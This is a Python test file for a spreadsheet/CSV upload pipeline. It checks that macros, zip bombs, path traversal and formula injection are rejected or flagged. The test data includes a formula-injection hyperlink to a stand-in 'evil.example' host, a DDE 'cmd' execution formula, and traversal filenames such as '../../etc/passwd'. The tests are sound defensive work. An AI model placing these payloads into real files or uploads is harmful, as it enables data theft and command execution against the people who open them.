"""TASK-DATA-002/004/014: hostile uploads are rejected with specific codes; nothing executes."""

import zipfile
from pathlib import Path

import polars as pl
import pytest

from app.core.errors import ApplicationError, DataError, SecurityError
from app.data.ingestion.errors import UnsupportedFormatError, UploadTooLargeError, reason_of
from app.data.ingestion.inspector import OLE2_MAGIC, FileInspector, InspectionLimits, sniff_head
from app.data.ingestion.pipeline import parser_for
from app.data.upload import safe_filename

from .conftest import FIXTURES, LIMITS, Ingest, generator_module

HOSTILE = FIXTURES / "hostile"


def _rejected(path: Path, **limits: int) -> ApplicationError:
    inspector = FileInspector(InspectionLimits(**{"max_bytes": 1 << 30, **limits}))
    with pytest.raises(ApplicationError) as info:
        parser_for(inspector.inspect(path), None, LIMITS)
    return info.value


def _rezip(src: Path, dest: Path, extra: dict[str, bytes], replace: dict[str, bytes]) -> Path:
    with zipfile.ZipFile(src) as zin, zipfile.ZipFile(dest, "w", zipfile.ZIP_DEFLATED) as zout:
        for info in zin.infolist():
            zout.writestr(info.filename, replace.get(info.filename, zin.read(info.filename)))
        for name, data in extra.items():
            zout.writestr(name, data)
    return dest


def test_macro_enabled_xlsm_is_rejected() -> None:
    err = _rejected(HOSTILE / "macro_enabled.xlsm")
    assert isinstance(err, SecurityError)
    assert (err.code, reason_of(err)) == ("SECURITY_ERROR", "MACRO_ENABLED")


def test_vba_part_in_plain_xlsx_is_still_rejected(tmp_path: Path) -> None:
    sneaky = _rezip(
        HOSTILE / "formulas_cached.xlsx", tmp_path / "x.xlsx", {"xl/vbaProject.bin": b"x"}, {}
    )
    assert reason_of(_rejected(sneaky)) == "MACRO_ENABLED"


@pytest.mark.parametrize(
    ("vba", "reason"), [(True, "MACRO_ENABLED"), (False, "UNSUPPORTED_FORMAT")]
)
def test_legacy_xls(tmp_path: Path, vba: bool, reason: str) -> None:
    body = "_VBA_PROJECT".encode("utf-16-le") if vba else b"\x00" * 64
    path = tmp_path / "legacy.xls"
    path.write_bytes(OLE2_MAGIC + b"\x00" * 1000 + body + b"\x00" * 10)
    assert reason_of(_rejected(path)) == reason


def test_zip_bomb_is_rejected_before_inflating(tmp_path: Path) -> None:
    bomb = tmp_path / "bomb.xlsx"
    generator_module().make_zip_bomb(bomb, decompressed_mb=20)
    err = _rejected(bomb)
    assert (err.code, reason_of(err)) == ("SECURITY_ERROR", "ZIP_BOMB")


def test_too_many_archive_entries(tmp_path: Path) -> None:
    path = tmp_path / "many.xlsx"
    with zipfile.ZipFile(path, "w") as z:
        for i in range(11):
            z.writestr(f"xl/part{i}.xml", b"<x/>")
    assert reason_of(_rejected(path, max_zip_entries=10)) == "ZIP_BOMB"


def test_total_uncompressed_cap() -> None:
    err = _rejected(HOSTILE / "formulas_cached.xlsx", max_uncompressed_bytes=100)
    assert reason_of(err) == "ZIP_BOMB"


def test_archive_entry_path_traversal_is_rejected(tmp_path: Path) -> None:
    path = tmp_path / "evil.xlsx"
    with zipfile.ZipFile(path, "w") as z:
        z.writestr("../../evil.xml", b"<x/>")
    assert reason_of(_rejected(path)) == "UNSAFE_ARCHIVE_PATH"


def test_oversized_file_is_rejected(tmp_path: Path) -> None:
    path = tmp_path / "big.csv"
    generator_module().make_oversized_csv(path, mb=2)
    err = _rejected(path, max_bytes=1 << 20)
    assert isinstance(err, UploadTooLargeError)
    assert (err.http_status, reason_of(err)) == (413, "OVERSIZED_FILE")


@pytest.mark.parametrize(
    ("content", "reason"),
    [
        (b"%PDF-1.7 not a table", "UNSUPPORTED_FORMAT"),
        (b"\x7fELF\x00\x00binary", "UNSUPPORTED_FORMAT"),
        (b'[{"a": 1}]', "UNSUPPORTED_FORMAT"),
        (b"", "EMPTY_FILE"),
    ],
)
def test_non_tabular_inputs(tmp_path: Path, content: bytes, reason: str) -> None:
    path = tmp_path / "f.csv"
    path.write_bytes(content)
    err = _rejected(path)
    assert isinstance(err, DataError)
    assert reason_of(err) == reason
    if reason == "UNSUPPORTED_FORMAT":
        assert isinstance(err, UnsupportedFormatError)
        assert err.http_status == 415
        assert err.details
        assert err.details["hint"]


def test_mislabelled_xlsx_is_ingested_by_sniffed_type(ingest: Ingest) -> None:
    report, _, _ = ingest(HOSTILE / "mislabelled_xlsx_as.csv")
    assert report.detected_type == "xlsx"
    assert "EXTENSION_MISMATCH" in report.flags
    assert report.rows_ingested == 10


def test_formula_injection_values_are_stored_verbatim_and_flagged(ingest: Ingest) -> None:
    report, storage, key = ingest(HOSTILE / "formula_injection.csv")
    assert "FORMULA_INJECTION_RISK:customer_name" in report.flags
    with storage.open_read(key) as f:
        names = pl.read_parquet(f)["customer_name"].to_list()
    assert names[0] == '=HYPERLINK("http://evil.example/steal","Click")'
    assert names[4] == "=1+1+cmd|' /c notepad'!A1"
    assert len([n for n in names if n[:1] in "=+-@"]) == 5  # labels.json injected_row_count


def test_excel_formulas_are_never_evaluated(ingest: Ingest, tmp_path: Path) -> None:
    source = HOSTILE / "formulas_cached.xlsx"
    report, storage, key = ingest(source)
    assert "FORMULA_CELLS_PRESENT" in report.flags
    with storage.open_read(key) as f:
        assert pl.read_parquet(f)["b"].to_list()[-1] == 60  # the cached <v>
    # A deliberately wrong cached value proves we read <v> and never compute SUM(A1:A3).
    with zipfile.ZipFile(source) as z:
        sheet = z.read("xl/worksheets/sheet1.xml").replace(b"<v>60</v>", b"<v>99</v>")
    lying = _rezip(source, tmp_path / "lying.xlsx", {}, {"xl/worksheets/sheet1.xml": sheet})
    _, storage, key = ingest(lying)
    with storage.open_read(key) as f:
        assert pl.read_parquet(f)["b"].to_list()[-1] == 99


@pytest.mark.parametrize(
    ("raw", "safe"),
    [
        ("../../etc/passwd", "passwd"),
        ("..\\..\\windows\\win.ini", "win.ini"),
        ("C:\\Users\\x\\sales.csv", "sales.csv"),
        ("bad\x00name\r\n.csv", "badname.csv"),
        ("", None),
        ("..", None),
    ],
)
def test_upload_filenames_are_reduced_to_display_basenames(raw: str, safe: str | None) -> None:
    assert safe_filename(raw) == safe


def test_sniff_head_ignores_extension() -> None:
    assert sniff_head((HOSTILE / "mislabelled_xlsx_as.csv").read_bytes()[:64]) == "zip"
    assert sniff_head(b"a,b\n1,2\n") == "text"
    assert sniff_head(OLE2_MAGIC + b"rest") == "ole2"
